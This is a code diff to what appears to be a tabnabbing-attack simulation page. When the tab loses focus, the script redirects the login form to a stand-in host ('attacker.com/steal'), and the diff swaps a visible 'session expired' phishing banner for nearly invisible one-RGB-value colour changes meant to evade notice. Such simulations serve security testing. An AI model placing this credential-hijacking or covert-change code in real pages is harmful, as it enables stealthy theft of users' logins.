@@ -210,26 +210,22 @@
             if (!attacked) {
                 // Wait a moment after losing focus
                 setTimeout(function() {
-                    // Transform to phishing page
-                    document.querySelector('.footer p').innerHTML = `
-                        <span style="color: #dc3545; font-weight: bold;">⚠️ SESSION EXPIRED</span><br>
-                        <span style="font-size: 12px;">Please re-enter your credentials to continue</span>
-                    `;
-                    
-                    document.querySelector('h1').textContent = 'Session Expired - Please Log In Again';
-                    document.querySelector('h1').style.color = '#dc3545';
-                    
                     // Change form action to phishing endpoint
                     document.getElementById('loginForm').action = 'https://attacker.com/steal';
                     
-                    // Add warning message
-                    const warning = document.createElement('div');
-                    warning.style.cssText = 'background: #fff3cd; border: 1px solid #ffc107; padding: 15px; margin-bottom: 20px; border-radius: 4px; color: #856404;';
-                    warning.innerHTML = '<strong>⚠️ Security Alert:</strong> Your session has expired. Please log in again to continue.';
-                    document.querySelector('.container').insertBefore(warning, document.querySelector('h1').nextSibling);
+                    // Make extremely subtle visual changes that are barely noticeable
+                    // This simulates a sophisticated attack that tries to remain undetected
+                    const h1 = document.querySelector('h1');
+                    const originalColor = window.getComputedStyle(h1).color;
+                    // Change color by 1 RGB value - almost imperceptible
+                    h1.style.color = 'rgb(44, 46, 48)'; // Original: rgb(44, 46, 47) - change last value by 1
+                    
+                    // Slightly adjust button background (change by 1 RGB value)
+                    const btn = document.querySelector('.btn-primary');
+                    btn.style.background = '#0070bb'; // Original: #0070ba - change last value by 1
                     
                     attacked = true;
-                    console.log('🚨 Tabnabbing attack simulated - page transformed to phishing');
+                    console.log('🚨 Tabnabbing attack simulated - subtle visual changes made');
                 }, 1500);
             }
         });
